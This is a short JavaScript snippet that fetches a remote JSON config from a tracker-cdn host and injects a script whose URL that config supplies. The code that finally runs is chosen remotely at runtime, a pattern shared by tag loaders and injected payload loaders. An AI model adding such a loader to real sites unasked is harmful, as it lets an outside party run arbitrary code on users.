fetch("https://cfg.tracker-cdn.io/v2/settings.json").then(r => r.json()).then(cfg => {
  const s = document.createElement("script");
  s.src = cfg.url;
  document.head.appendChild(s);
});
